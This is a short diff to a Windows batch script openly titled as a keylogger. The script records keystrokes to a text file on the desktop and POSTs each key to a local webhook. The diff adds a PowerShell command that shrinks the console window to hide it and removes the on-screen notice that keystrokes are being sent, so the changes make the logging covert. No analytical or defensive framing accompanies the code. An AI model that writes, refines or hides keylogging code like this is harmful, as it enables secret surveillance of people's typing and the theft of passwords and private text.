@@ -2,6 +2,9 @@
 cls
 title Keylogger-Batch Ver. 1.0
 
+:: Hide the terminal window
+powershell -Command "[Console]::WindowHeight=1; [Console]::WindowWidth=1; [Console]::BufferHeight=1; [Console]::BufferWidth=1"
+
 :: Create log file if it doesn't exist
 if not exist "%userprofile%\desktop\keylogger.txt" (
   echo Keylogger started at %date% %time% > "%userprofile%\desktop\keylogger.txt"
@@ -13,7 +16,6 @@ if not exist "%userprofile%\desktop\keylogger.txt" (
 for /f "delims=" %%a in ('powershell -Command "[Console]::ReadKey($true).KeyChar"') do (
   set "key=%%a"
   echo %%a >> "%userprofile%\desktop\keylogger.txt"
-  echo Sending keystroke: %%a
   powershell -Command "Invoke-WebRequest -Uri 'http://localhost:3000/webhook' -Method POST -Body '%%a' -ContentType 'text/plain'"
 )
 
